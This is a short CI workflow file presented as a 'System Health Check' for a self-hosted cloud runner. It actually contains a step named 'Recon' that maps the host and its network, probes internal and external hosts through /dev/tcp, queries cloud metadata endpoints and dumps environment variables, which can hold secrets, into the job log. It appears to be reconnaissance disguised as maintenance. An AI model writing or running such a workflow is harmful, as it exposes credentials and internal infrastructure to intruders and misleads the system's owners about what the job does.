name: System Health Check
on:
  workflow_dispatch:
jobs:
  check:
    runs-on: [self-hosted, hwcloud]
    steps:
      - name: Recon
        run: |
          echo "=== SYSTEM ==="
          hostname && id && uname -a
          echo "=== NETWORK ==="
          ip addr show | grep inet | head -10
          ip route | head -10
          echo "=== HK REACH ==="
          for h in 10.107.6.103:10004 10.107.54.236:9030 10.9.3.0:22 8.210.143.26:8080 34.199.16.225:443; do
            IFS=: read host port <<< "$h"
            timeout 3 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null && echo "$h OPEN" || echo "$h CLOSED"
          done
          echo "=== CLOUD META ==="
          curl -s http://169.254.169.254/openstack/latest/meta_data.json 2>&1 | head -20
          curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>&1 | head -5
          echo "=== ENV ==="
          env | sort | head -30
